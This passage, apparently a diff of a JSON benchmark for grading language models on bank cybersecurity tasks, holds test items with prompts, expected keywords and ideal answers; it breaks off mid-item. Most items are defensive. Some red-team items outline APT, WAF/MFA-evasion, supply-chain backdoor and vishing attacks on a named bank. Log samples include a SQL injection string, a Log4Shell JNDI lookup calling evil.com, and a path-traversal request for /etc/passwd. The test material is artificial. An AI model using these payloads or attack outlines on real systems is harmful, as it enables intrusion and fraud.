+      "prompt": "You are a red team AI simulating an APT campaign against Altoro Mutual bank.\n\nRecon data: {\"employees\": [\"cfo@altoro.com\", \"admin@altoro.com\"], \"stack\": [\"Apache Tomcat 7\", \"Java 8\", \"MySQL 5.7\"], \"ports\": [22, 80, 443, 8080], \"subdomains\": [\"admin.altoro.com\", \"api.altoro.com\"]}\n\nSimulate a full multi-phase APT campaign using MITRE ATT&CK. Include command and control, dwell time strategy, and exfiltration method.",
+      "expected_keywords_in_response": ["spear phishing", "C2", "command and control", "dwell time", "Tomcat deserialization", "lateral movement", "privilege escalation", "slow exfiltration", "APT", "multi-phase"],
+      "evaluation_criteria": {
+        "accuracy": "Must demonstrate APT sophistication vs script kiddie",
+        "completeness": "Must cover all APT phases including C2 and dwell time",
+        "technical_depth": "Must leverage specific tech stack vulnerabilities (Tomcat 7, Java 8)"
+      },
+      "ideal_answer_summary": "Phase 1: Spear phish CFO. Phase 2: Establish C2 via HTTPS beacon. Phase 3: Dwell 2 weeks — map internal network quietly. Phase 4: Tomcat 7 deserialisation RCE. Phase 5: Root access, DB dump. Phase 6: Slow exfil over 3 days via DNS tunnelling to avoid DLP detection."
+    },
+
+    {
+      "id": "TC-048",
+      "category": "red_team_mitre",
+      "difficulty": "hard",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI conducting a purple team exercise on Altoro Mutual bank.\n\nDefences in place: WAF, IDS, MFA, email filtering\nVulnerabilities: SSRF on /fetch endpoint, Tomcat 7 RCE, weak session management\n\nSimulate a complete attack that evades ALL 4 defensive controls. Then provide exact detection opportunities the blue team missed at each evasion step.",
+      "expected_keywords_in_response": ["WAF bypass", "URL encoding", "IDS evasion", "slow scan", "MFA bypass", "SIM swap", "Tomcat", "detection opportunity", "blue team", "purple team", "missed"],
+      "evaluation_criteria": {
+        "accuracy": "Must demonstrate realistic evasion technique for each control",
+        "completeness": "Must cover attack AND detection opportunities",
+        "sophistication": "Purple team format requires both attacker and defender analysis"
+      },
+      "ideal_answer_summary": "WAF bypass: URL-encoded SSRF payload. IDS evasion: 1 packet/min slow scan. MFA bypass: SIM swap on employee. Tomcat 7 RCE for full access. Blue team missed: encoding anomaly in logs, SIM swap alert, unusual outbound SSRF traffic, Java process spawning shell."
+    },
+
+    {
+      "id": "TC-049",
+      "category": "red_team_mitre",
+      "difficulty": "medium",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI simulating a supply chain attack on Altoro Mutual bank.\n\nContext: {\"target\": \"Altoro Mutual\", \"vector\": \"third-party payment-gateway-sdk v2.3.1\", \"library_info\": {\"downloads\": 15000, \"maintainers\": 1, \"last_update\": \"8 months ago\"}}\n\nSimulate how a supply chain attack against this library would be executed.",
+      "expected_keywords_in_response": ["supply chain", "maintainer compromise", "malicious version", "backdoor", "CI/CD", "dependency", "SBOM", "typosquatting", "code signing", "automatic update"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly model supply chain attack via single maintainer compromise",
+        "completeness": "Must cover attacker methodology and bank impact",
+        "sophistication": "Must reference real-world supply chain techniques"
+      },
+      "ideal_answer_summary": "Compromise sole maintainer via phishing → inject backdoor in v2.3.2 → bank updates via automatic dependency update → malicious code executes in payment processing. Defence: SBOM, pin dependencies, code signing verification, vendor security review."
+    },
+
+    {
+      "id": "TC-050",
+      "category": "red_team_mitre",
+      "difficulty": "medium",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI simulating a vishing (voice phishing) social engineering attack on a bank employee.\n\nTarget: {\"name\": \"Sarah\", \"role\": \"customer service rep\", \"known_info\": \"works 9-5, uses Outlook, handles account resets\"}\n\nSimulate the vishing call script, what information could be extracted, and what controls would stop this.",
+      "expected_keywords_in_response": ["vishing", "pretexting", "IT helpdesk", "urgency", "authority", "account reset", "credentials", "customer data", "callback verification", "security awareness training"],
+      "evaluation_criteria": {
+        "accuracy": "Must demonstrate realistic social engineering techniques (pretexting, urgency, authority)",
+        "completeness": "Must cover pretext, execution, data extraction, and defences",
+        "defensive": "Must identify specific controls that would prevent this"
+      },
+      "ideal_answer_summary": "Pretext: IT helpdesk emergency system breach. Urgency: account compromised, verify identity now. Extract: employee credentials, customer account info, reset procedures. Defence: callback verification policy, never share credentials by phone, security awareness training."
+    },
+
+    {
+      "id": "TC-051",
+      "category": "vulnerability_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP finding on AWS-hosted banking application:\n{\"alert\": \"Server Side Request Forgery\", \"risk\": \"High\", \"url\": \"/fetch?url=http://internal-service\", \"evidence\": \"Internal service data returned\"}\n\nExplain why SSRF is especially dangerous in an AWS EC2 environment.",
+      "expected_keywords_in_response": ["SSRF", "AWS metadata", "169.254.169.254", "IAM credentials", "EC2 instance role", "cloud account takeover", "internal network", "credential theft"],
+      "evaluation_criteria": {
+        "accuracy": "Must mention AWS metadata service 169.254.169.254",
+        "completeness": "Must explain SSRF → metadata → IAM credentials → full AWS account access chain",
+        "cloud_context": "Must demonstrate AWS-specific impact beyond generic SSRF"
+      },
+      "ideal_answer_summary": "SSRF on AWS can reach metadata service at 169.254.169.254 to steal EC2 IAM role credentials. With IAM credentials: access all S3 buckets, RDS databases, other EC2 instances. Full cloud account compromise from single SSRF."
+    },
+
+    {
+      "id": "TC-052",
+      "category": "kill_switch_playbook",
+      "difficulty": "easy",
+      "ps_requirement": "PS#6",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nPre-attack indicators detected (attack not yet started):\n{\"darkweb_mention\": true, \"port_scans_last_48h\": 12, \"leaked_credentials\": 3, \"unpatched_cve\": \"CVE-2021-44228\", \"phishing_kit_found\": true}\n\nGenerate PROACTIVE defensive measures to prevent the predicted attack before it materialises. This is PS#6 — recommend defences BEFORE attack occurs.",
+      "expected_keywords_in_response": ["proactive", "before attack", "patch Log4j", "credential reset", "firewall", "pre-emptive", "priority", "prevent", "dark web monitoring"],
+      "evaluation_criteria": {
+        "accuracy": "Must recommend Log4j patching and credential reset as top priorities",
+        "framing": "Must be framed as prevention, not response",
+        "completeness": "Must address all 5 indicators"
+      },
+      "ideal_answer_summary": "Priority 1: Emergency patch CVE-2021-44228 (Log4j) — known imminent target. Priority 2: Force reset 3 leaked credentials immediately. Priority 3: Block IPs from port scans. Priority 4: Enhanced monitoring. Priority 5: Takedown phishing kit via GitHub abuse report."
+    },
+
+    {
+      "id": "TC-053",
+      "category": "root_cause_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#9",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nPost-Kill-Switch — attack was stopped. Generate automated RCA report for the dashboard:\n{\"attack\": \"SQL Injection\", \"duration_minutes\": 23, \"records_exposed\": 4500, \"MTTD_minutes\": 18, \"MTTR_minutes\": 5, \"remediation\": \"IP block + WAF rule\", \"outcome\": \"Stopped\"}\n\nInclude: what failed, what worked, MTTD/MTTR assessment, and 3 specific improvements.",
+      "expected_keywords_in_response": ["MTTD 18 minutes", "MTTR 5 minutes", "root cause", "no WAF", "SQL injection prevention", "improvements", "4500 records", "what worked", "what failed"],
+      "evaluation_criteria": {
+        "accuracy": "MTTD must be assessed as 18 min (too slow for banking), MTTR 5 min acceptable",
+        "completeness": "All required RCA sections present",
+        "improvements": "3 specific, actionable improvements"
+      },
+      "ideal_answer_summary": "MTTD: 18 min (target <5 min — needs improvement). MTTR: 5 min (good). Root cause: No WAF pre-deployed, no real-time SQL injection signature detection. What worked: Kill Switch approval. 3 improvements: pre-deploy WAF, IDS SQL injection rules, automated blocking at 10 attempts."
+    },
+
+    {
+      "id": "TC-054",
+      "category": "threat_landscape",
+      "difficulty": "medium",
+      "ps_requirement": "PS#1",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nCompare security posture between two weeks:\nWeek 1: {\"critical_vulns\": 6, \"incidents\": 2, \"risk_score\": 84, \"patches_applied\": 0}\nWeek 2: {\"critical_vulns\": 2, \"incidents\": 6, \"risk_score\": 76, \"patches_applied\": 4}\n\nExplain the trend and whether the bank is more or less secure.",
+      "expected_keywords_in_response": ["mixed picture", "fewer vulns", "more incidents", "patching working", "attack activity increased", "paradox", "risk score misleading", "active targeting"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify the paradox: fewer vulns but more incidents = more active attackers",
+        "completeness": "Must analyse both metrics and the relationship between them",
+        "insight": "Must explain why risk score drop is misleading"
+      },
+      "ideal_answer_summary": "Mixed picture. Patching is working (4 CVEs fixed). But incident count tripled = attack activity increasing. Risk score drop from 84 to 76 is misleading — bank is under more active attack than last week. Net assessment: vulnerability posture improving but threat actor activity surging."
+    },
+
+    {
+      "id": "TC-055",
+      "category": "vulnerability_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nNessus finding:\n{\"finding\": \"Default credentials in use\", \"severity\": \"Critical\", \"details\": \"MySQL accessible with user:root password:root\", \"host\": \"10.0.0.10\", \"port\": 3306}\n\nExplain why this is rated Critical and what a real attacker would do with this access.",
+      "expected_keywords_in_response": ["root access", "full database control", "DROP", "customer data dump", "transaction history", "critical", "immediate", "default credentials", "all tables"],
+      "evaluation_criteria": {
+        "accuracy": "Must explain complete MySQL root access implications",
+        "completeness": "Must list specific attacker actions",
+        "urgency": "Must treat as immediate emergency"
+      },
+      "ideal_answer_summary": "MySQL root with default creds = complete DB control. Attacker can: dump all 50K customer records, delete all data, add backdoor users, read config files with other credentials, pivot to other systems. Change password immediately — this is a critical emergency."
+    },
+
+    {
+      "id": "TC-056",
+      "category": "incident_response",
+      "difficulty": "medium",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nAnomaly detected:\n{\"event\": \"Same customer account logged in from India, Russia, and Nigeria within 90 minutes\", \"account_type\": \"premium_customer\", \"actions\": [\"viewed balance\", \"initiated $3000 transfer\", \"changed security questions\"]}\n\nPredict what is happening and what will happen next if not stopped.",
+      "expected_keywords_in_response": ["impossible travel", "account takeover", "credential theft", "money mule", "transfer", "block account", "freeze", "fraud", "predict", "financial loss"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify impossible travel = account takeover",
+        "prediction": "Must predict transfer will complete and additional fraud will follow",
+        "urgency": "Must recommend immediate account freeze"
+      },
+      "ideal_answer_summary": "Impossible travel = account takeover via credential theft or SIM swap. $3000 transfer = first fraud attempt. Security question change = locking out real customer. Prediction: transfer completes, account locked out, more fraud follows. Immediate: freeze account and reverse pending transfer."
+    },
+
+    {
+      "id": "TC-057",
+      "category": "config_recommendations",
+      "difficulty": "medium",
+      "ps_requirement": "PS#10",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nAuthentication configuration audit:\n{\"password_min_length\": 6, \"complexity\": false, \"expiry\": \"never\", \"mfa\": false, \"session_timeout_hours\": 8, \"failed_login_lockout\": false, \"password_history\": false}\n\nThis is a banking application. Generate hardened authentication configuration meeting PCI-DSS and NIST SP 800-63B standards.",
+      "expected_keywords_in_response": ["12 characters", "complexity", "MFA mandatory", "session timeout 15", "5 attempts lockout", "password history 12", "PCI-DSS", "NIST", "banking standard"],
+      "evaluation_criteria": {
+        "accuracy": "Must recommend MFA as mandatory for banking",
+        "completeness": "Must address all 7 configuration items",
+        "standards": "Must reference PCI-DSS and/or NIST SP 800-63B"
+      },
+      "ideal_answer_summary": "Min 12 chars + complexity (upper, lower, number, symbol). Mandatory MFA (TOTP or hardware key). Session timeout 15 minutes. Lockout after 5 attempts (30 min). Password history 12. PCI-DSS requirement 8.3. Expiry: 90 days."
+    },
+
+    {
+      "id": "TC-058",
+      "category": "vulnerability_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP scan of the bank's information disclosure:\n{\"findings\": [\n  {\"alert\": \"Stack trace in error page\", \"evidence\": \"java.sql.SQLException at com.altoro.db.UserDAO:142\"},\n  {\"alert\": \"Server version in header\", \"evidence\": \"Server: Apache/2.2.34\"},\n  {\"alert\": \"Internal IP in response\", \"evidence\": \"X-Internal-Host: 10.0.0.10\"},\n  {\"alert\": \"DB connection in HTML comment\", \"evidence\": \"<!-- DB: mysql://10.0.0.10:3306/bankdb user=root -->\"}\n]}\n\nRank by severity and explain what each tells an attacker.",
+      "expected_keywords_in_response": ["DB connection string", "most critical", "root credentials", "stack trace", "code path", "Apache 2.2", "CVE", "internal IP", "attack surface", "rank"],
+      "evaluation_criteria": {
+        "accuracy": "Must rank DB connection string with root credentials as most critical",
+        "completeness": "Must explain attacker value of each finding",
+        "ranking": "Correct priority order with justification"
+      },
+      "ideal_answer_summary": "1. DB comment (Critical) — tells attacker DB IP, port, name, and root username. 2. Stack trace (High) — reveals code structure and exact file paths for targeted attacks. 3. Apache 2.2.34 (High) — maps to specific CVEs. 4. Internal IP (Medium) — confirms internal topology."
+    },
+
+    {
+      "id": "TC-059",
+      "category": "defense_gap",
+      "difficulty": "hard",
+      "ps_requirement": "PS#12",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSecurity controls assessment against NIST Cybersecurity Framework:\n{\"has_firewall\": true, \"has_IDS\": false, \"has_WAF\": false, \"has_SIEM\": false, \"has_MFA\": false, \"has_DLP\": false, \"has_EDR\": false, \"has_patch_management\": true, \"has_backup\": true, \"security_training\": false}\n\nMap each control to NIST CSF functions and identify the biggest gaps.",
+      "expected_keywords_in_response": ["NIST", "Identify", "Protect", "Detect", "Respond", "Recover", "WAF", "SIEM", "MFA", "DLP", "EDR", "Detect function missing", "gap"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly map controls to NIST CSF 5 functions",
+        "completeness": "Must assess all 10 controls",
+        "framework": "Must structure analysis using NIST CSF"
+      },
+      "ideal_answer_summary": "Identify: OK (firewall, patch mgmt). Protect: critical gaps (no MFA, WAF, DLP). Detect: completely missing (no IDS, no SIEM, no EDR). Respond: no SIEM = no detection = no response possible. Recover: OK (backup). Biggest gap: Detect function entirely absent."
+    },
+
+    {
+      "id": "TC-060",
+      "category": "network_topology",
+      "difficulty": "medium",
+      "ps_requirement": "PS#3",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap + SpiderFoot combined:\nnmap: {\"hosts\": [{\"ip\": \"10.0.0.5\", \"ports\": [80, 443, 22]}, {\"ip\": \"10.0.0.8\", \"ports\": [8080, 3306]}, {\"ip\": \"10.0.0.15\", \"ports\": [21, 23, 8443]}]}\nSpiderFoot: {\"findings\": [{\"type\": \"IP_THREAT\", \"data\": \"10.0.0.5 found in TOR exit node list\"}, {\"type\": \"OPEN_PORT\", \"data\": \"FTP 21 open with anonymous login enabled\"}]}\n\nCorrelate both tools to assess overall network risk posture.",
+      "expected_keywords_in_response": ["TOR exit node", "threat feed", "FTP anonymous", "Telnet 23", "legacy protocol", "correlation", "critical risk", "immediate", "3306 internal only"],
+      "evaluation_criteria": {
+        "accuracy": "Must correlate TOR listing with open ports for full risk picture",
+        "completeness": "Must flag Telnet 23 and FTP 21 as legacy/critical",
+        "correlation": "Must demonstrate combined risk from both tools"
+      },
+      "ideal_answer_summary": "TOR exit node listing on 10.0.0.5 = bank IP on attackers' lists. FTP anonymous = data exfiltration path. Telnet 23 = unencrypted protocol. MySQL 3306 on app-server = should be internal only. Combined posture: Critical. Immediate closure of 21, 23, 3306 required."
+    },
+
+    {
+      "id": "TC-061",
+      "category": "root_cause_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#9",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank. Write a formal root cause analysis report for the following confirmed breach.\n\nIncident: Customer database of 45,000 records exfiltrated over 3 days.\nTimeline reconstruction:\n- Day 1 10:00: SpiderFoot alert — 3 staff credentials found on dark web (no action taken)\n- Day 1 14:00: Attacker VPN login with stolen credentials from Russia\n- Day 2 09:00: Internal nmap scan run by attacker on subnet\n- Day 3 02:00: Log4Shell CVE-2021-44228 exploited on internal server\n- Day 5 08:00: DB dump started — 200 records/min exfiltrated via DNS tunnelling\n- Day 8 09:00: Customer fraud alerts — investigation started\n\nWrite complete RCA with executive summary, timeline, root causes, contributing factors, and 5 lessons learned.",
+      "expected_keywords_in_response": ["8 days dwell time", "dark web alert ignored", "primary root cause", "contributing factors", "DNS tunnelling", "Log4Shell unpatched", "lessons learned", "executive summary", "MTTD 8 days", "process failure"],
+      "evaluation_criteria": {
+        "accuracy": "Primary root cause = dark web alert ignored. Contributing = Log4j unpatched, no internal anomaly detection",
+        "completeness": "Must include all 5 required report sections",
+        "lessons": "5 specific, actionable lessons"
+      },
+      "ideal_answer_summary": "Executive: 8-day breach, 45K records. Primary root cause: dark web alert not actioned. Contributing: Log4j unpatched, VPN no geo-restriction, no internal scanning detection, DNS exfil undetected. 5 lessons: auto-reset on dark web hits, VPN geo-block, internal anomaly detection, patch management SLA, DNS monitoring."
+    },
+
+    {
+      "id": "TC-062",
+      "category": "incident_response",
+      "difficulty": "hard",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nActive incident — data exfiltration in progress RIGHT NOW:\n{\"status\": \"active\", \"method\": \"SQL injection\", \"rate\": \"300 records/minute\", \"duration\": \"8 minutes so far\", \"total_exfiltrated\": 2400, \"target_table\": \"customers\", \"attacker_ip\": \"45.220.11.8\"}\n\n2,400 records already gone. Every minute = 300 more. Generate emergency response with time urgency.",
+      "expected_keywords_in_response": ["every minute", "300 records", "immediate", "block database", "kill connection", "WAF", "attacker IP", "forensic", "time critical", "stop now"],
+      "evaluation_criteria": {
+        "accuracy": "Must stop DB connection as first priority to stop ongoing leak",
+        "urgency": "Must reflect that every second = more records stolen",
+        "completeness": "Containment + evidence + notification all covered"
+      },
+      "ideal_answer_summary": "IMMEDIATE: Kill attacker DB connection. Block IP 45.220.11.8. WAF rule for SQL injection. Every 60 seconds = 300 more records. At 8 minutes already 2,400 stolen. Forensic: don't restart services — preserve connection logs. GDPR clock started when attack started."
+    },
+
+    {
+      "id": "TC-063",
+      "category": "vulnerability_analysis",
+      "difficulty": "easy",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP finding:\n{\"alert\": \"Directory Traversal\", \"risk\": \"High\", \"url\": \"/download?file=../../../etc/passwd\", \"evidence\": \"root:x:0:0:root:/root:/bin/bash\"}\n\nExplain what information was exposed and what an attacker can do next.",
+      "expected_keywords_in_response": ["directory traversal", "/etc/passwd", "path traversal", "sensitive files", "private keys", "database credentials", "config files", "escalation", "/etc/shadow"],
+      "evaluation_criteria": {
+        "accuracy": "Must explain what /etc/passwd reveals and what other files could be accessed",
+        "completeness": "Must list escalation paths beyond /etc/passwd",
+        "banking_context": "Must relate to banking system file exposure"
+      },
+      "ideal_answer_summary": "Directory traversal exposed user list via /etc/passwd. Attacker can next access: /etc/shadow (hashed passwords), SSH private keys, web server config with DB credentials, application config files. Full server compromise possible via credential extraction."
+    },
+
+    {
+      "id": "TC-064",
+      "category": "kill_switch_playbook",
+      "difficulty": "medium",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nKill Switch was just approved and deployed:\n{\"action_taken\": \"Blocked IP 185.220.101.45 + Enabled WAF SQL injection rule #442\"}\n\nGenerate post-remediation verification checklist and confirmation report for the dashboard. Include what to check to confirm attack has stopped.",
+      "expected_keywords_in_response": ["verify", "no further requests", "WAF rule active", "confirmation", "check logs", "attack stopped", "monitoring window", "incident ticket", "24 hour"],
+      "evaluation_criteria": {
+        "accuracy": "Must provide concrete, verifiable steps",
+        "completeness": "Technical verification + business confirmation",
+        "format": "Clear checklist format suitable for dashboard display"
+      },
+      "ideal_answer_summary": "Verify: 1) Zero requests from 185.220.101.45 in last 5 min. 2) WAF rule 442 active and blocking. 3) /login responding normally. 4) No new DB anomalies. 5) Create incident ticket INC-XXX. 6) 24-hour enhanced monitoring window. 7) Schedule post-incident review."
+    },
+
+    {
+      "id": "TC-065",
+      "category": "defense_gap",
+      "difficulty": "medium",
+      "ps_requirement": "PS#12",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nRed team exercise results:\n{\"attacks_attempted\": 15, \"attacks_succeeded\": 9, \"detected\": 4, \"blocked\": 2, \"undetected_success\": 5, \"MTTD_avg_minutes\": 52, \"MTTR_avg_minutes\": 210}\n\nGenerate defence gap analysis report with security maturity rating.",
+      "expected_keywords_in_response": ["60% success rate", "MTTD 52 minutes", "MTTR 210 minutes", "maturity", "Level 1", "gaps", "automation", "SOC", "5 undetected", "improvement roadmap"],
+      "evaluation_criteria": {
+        "accuracy": "Must calculate correct success/detection rates",
+        "completeness": "Detection and response gaps both assessed",
+        "maturity": "Must assign security maturity level with justification"
+      },
+      "ideal_answer_summary": "60% attack success rate = critical. Only 27% detection rate. MTTD 52min and MTTR 3.5hrs both unacceptable for banking. 5 attacks succeeded undetected. Maturity: Level 1 (Initial). Roadmap: SIEM deployment, automated response, SOC capability building."
+    },
+
+    {
+      "id": "TC-066",
+      "category": "pre_filter_triage",
+      "difficulty": "medium",
+      "ps_requirement": "PS#4",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system. Compare this event against historical pattern and classify. Respond in JSON only.\n\nNew event: {\"type\": \"api_call\", \"endpoint\": \"/api/transfer\", \"user\": \"cust_551\", \"amount\": 9800, \"frequency\": \"first transfer ever\", \"time\": \"02:15 AM\"}\n\nHistorical baseline for cust_551: {\"avg_transfer\": 0, \"transfer_count_ever\": 0, \"usual_active_hours\": \"9AM-6PM\"}\n\nRespond: {\"suspicious\": bool, \"confidence\": float, \"reason\": str, \"escalate\": bool}",
+      "expected_keywords_in_response": ["suspicious", "true", "first transfer", "2AM", "off hours", "$9800", "escalate", "anomalous", "no history"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag as suspicious — first ever transfer, $9,800, at 2AM = account takeover indicator",
+        "format": "Valid JSON",
+        "reasoning": "Must note deviation from zero-transfer historical baseline"
+      },
+      "ideal_answer_summary": "suspicious: true, confidence: 0.95, reason: first ever transfer of $9800 at 2AM outside normal hours = account takeover indicator, escalate: true"
+    },
+
+    {
+      "id": "TC-067",
+      "category": "websocket_classification",
+      "difficulty": "hard",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time dashboard event classifier. Classify this entire batch of log entries for WebSocket streaming. Respond JSON array only.\n\nLogs:\n1. \"2026-03-14 22:00 GET /robots.txt 200 from 45.33.22.11\"\n2. \"2026-03-14 22:01 POST /login username=admin' OR '1'='1-- 500\"\n3. \"2026-03-14 22:01 GET /account?id=2001 user=cust_100 200\" (cust_100 owns account 1001 not 2001)\n4. \"2026-03-14 22:02 RuntimeException: ${jndi:ldap://evil.com/x} in User-Agent\"\n5. \"2026-03-14 22:02 GET /index.html 200 from 10.0.0.1\"\n\nFor each: {\"id\": int, \"threat\": str, \"severity\": str, \"color\": str, \"escalate\": bool}",
+      "expected_keywords_in_response": ["SQL injection", "Log4Shell", "JNDI", "critical", "IDOR", "recon", "red", "orange", "yellow", "green", "false"],
+      "evaluation_criteria": {
+        "accuracy": "1=recon/low/yellow/false, 2=SQLi/critical/red/true, 3=IDOR/high/orange/true, 4=Log4Shell/critical/red/true, 5=normal/none/green/false",
+        "format": "Valid JSON array, all 5 entries",
+        "completeness": "All 5 classified correctly"
+      },
+      "ideal_answer_summary": "1:recon/low/yellow/false. 2:SQL injection/critical/red/true. 3:IDOR/high/orange/true. 4:Log4Shell/critical/red/true. 5:normal/none/green/false."
+    },
+
+    {
+      "id": "TC-068",
+      "category": "attack_path_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nLIVE ATTACK — Rogue device detected:\nnmap: {\"new_host\": \"10.0.0.99\", \"os\": \"Raspberry Pi\", \"port\": 4444}\nLogs: {\"event\": \"10.0.0.99 making API calls to /api/transfer\", \"amount\": \"$500 x 22 calls in 11 minutes\", \"total_stolen\": 11000}\nZAP: {\"csrf\": \"/transfer — no token validation\"}\nSpiderFoot: {\"dark_web\": \"altoro.com credentials for sale — listed 7 hours ago\"}\n\n$11,000 stolen in 11 minutes. What is happening and what happens next if not stopped?",
+      "expected_keywords_in_response": ["rogue device", "CSRF", "automated", "$11,000", "dark web credentials", "money mule", "financial loss", "escalating", "$500 per transfer", "stop immediately"],
+      "evaluation_criteria": {
+        "accuracy": "Must connect rogue Pi + CSRF + dark web credentials = automated fund theft operation",
+        "urgency": "Must communicate $1,000/minute ongoing loss rate",
+        "prediction": "Must predict continued escalating theft if not stopped"
+      },
+      "ideal_answer_summary": "Rogue Pi using stolen credentials + CSRF to automate $500 transfers. Rate: $1,000/min. Next 10 min: additional $10,000 loss. Predicted total if not stopped: $50,000+. STOP: Isolate 10.0.0.99 + disable /api/transfer + invalidate all sessions NOW."
+    },
+
+    {
+      "id": "TC-069",
+      "category": "vulnerability_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nNessus found these three weaponised CVEs:\n[\n  {\"cve\": \"CVE-2017-0144\", \"name\": \"EternalBlue\", \"host\": \"10.0.0.5\", \"port\": 445},\n  {\"cve\": \"CVE-2020-1472\", \"name\": \"Zerologon\", \"host\": \"10.0.0.2\", \"service\": \"Netlogon\"},\n  {\"cve\": \"CVE-2021-26855\", \"name\": \"ProxyLogon\", \"host\": \"10.0.0.15\", \"service\": \"Exchange\"}\n]\n\nAll have public exploits. Prioritise and explain the blast radius of each for a banking environment.",
+      "expected_keywords_in_response": ["Zerologon", "domain admin", "EternalBlue", "wormable", "ProxyLogon", "email", "blast radius", "domain compromise", "priority 1", "instant"],
+      "evaluation_criteria": {
+        "accuracy": "Must prioritise Zerologon first (instant domain admin = full network)",
+        "completeness": "Blast radius explained for all 3",
+        "banking_context": "Must relate each to banking-specific impact"
+      },
+      "ideal_answer_summary": "Priority 1: Zerologon (instant domain admin = complete network compromise). Priority 2: EternalBlue (wormable, WannaCry-style lateral spread). Priority 3: ProxyLogon (Exchange compromise = email access, potential BEC). All require emergency patching TODAY."
+    },
+
+    {
+      "id": "TC-070",
+      "category": "kill_switch_playbook",
+      "difficulty": "hard",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nLog4Shell emergency — CVE-2021-44228 detected on production server:\n{\"cve\": \"CVE-2021-44228\", \"cvss\": 10.0, \"host\": \"10.0.0.25\", \"service\": \"Elasticsearch\", \"publicly_exploited\": true, \"exploit_in_wild\": true, \"jndi_attempt_detected\": true}\n\nActive exploitation attempt detected. Generate emergency Log4Shell Kill Switch playbook.",
+      "expected_keywords_in_response": ["log4j2.formatMsgNoLookups", "JNDI", "update 2.17", "isolate", "WAF block jndi", "outbound LDAP block", "CVSS 10", "emergency", "24 hours", "scan all instances"],
+      "evaluation_criteria": {
+        "accuracy": "Must include correct Log4Shell mitigation (formatMsgNoLookups=true or upgrade to 2.17)",
+        "completeness": "Immediate workaround + permanent fix + network controls",
+        "urgency": "CVSS 10 with active exploitation = maximum urgency"
+      },
+      "ideal_answer_summary": "Immediate: Set log4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI at firewall. WAF rule blocking ${jndi: pattern. Permanent: Upgrade to Log4j 2.17.1+. Scan ALL systems for Log4j usage. 24hr deadline. CVSS 10.0 — no exceptions."
+    },
+
+    {
+      "id": "TC-071",
+      "category": "network_topology",
+      "difficulty": "hard",
+      "ps_requirement": "PS#3",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
